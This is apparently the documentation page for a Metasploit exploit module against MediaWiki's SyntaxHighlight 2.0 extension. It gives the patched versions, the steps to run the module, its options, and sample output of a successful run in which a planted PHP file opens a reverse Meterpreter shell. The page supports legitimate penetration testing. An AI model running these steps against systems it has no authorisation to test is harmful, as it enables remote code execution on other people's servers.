## Vulnerable Application

  Any MediaWiki installation with SyntaxHighlight version 2.0 installed & enabled. This extension ships with the AIO package of MediaWiki 1.27.x & 1.28.x. A fix for this issue is included in MediaWiki version 1.28.2 and version 1.27.3.

## Verification Steps

  1. `use exploit/multi/http/mediawiki_syntaxhighlight`
  2. `set RHOST <ip target site>`
  3. `set TARGETURI <MediaWiki path>`
  4. `set UPLOADPATH <writable path in web root>`
  5. optionally set `RPORT`, `SSL`, and `VHOST`
  6. `exploit`
  7. **Verify** a new Meterpreter session is started
  
## Options

  **TARGETURI**

  The MediaWiki base path, the URL path on which MediaWiki is exposed. This is normally `/mediawiki`, `/wiki`, or `/w`.

  **UPLOADPATH**

  Folder name where MediaWiki stores the uploads, make sure to use a relative path here. For a regular installation this is the `images` folder. This folder needs to be writable by MediaWiki and accessible from the web root. The exploit will try to create a PHP file in this location that will later be called through the web server.

  **CLEANUP**

  Set this to true (the default) to unlink the PHP file created by this exploit module. The cleanup code will only be called when the exploit is successful.

  **USERNAME**

  In case the wiki is configured as private, a read-only (or better) account is needed to exploit this issue. Provide the username of that account here.

  **PASSWORD**

  In case the wiki is configured as private, a read-only (or better) account is needed to exploit this issue. Provide the password of that account here.

## Sample Output
### MediaWiki 1.27.1-2 on Ubuntu 16.10

```
msf > use exploit/multi/http/mediawiki_syntaxhighlight 
msf exploit(mediawiki_syntaxhighlight) > set RHOST 192.168.146.137
RHOST => 192.168.146.137
msf exploit(mediawiki_syntaxhighlight) > set TARGETURI /mediawiki
TARGETURI => /mediawiki
msf exploit(mediawiki_syntaxhighlight) > exploit

[*] Started reverse TCP handler on 192.168.146.197:4444 
[*] Local PHP file: images/bwpqtiqgmeydivskjcjltnldb.php
[*] Trying to run /mediawiki/images/bwpqtiqgmeydivskjcjltnldb.php
[*] Sending stage (33986 bytes) to 192.168.146.137
[*] Meterpreter session 1 opened (192.168.146.197:4444 -> 192.168.146.137:55768) at 2017-04-29 14:27:03 +0200
```
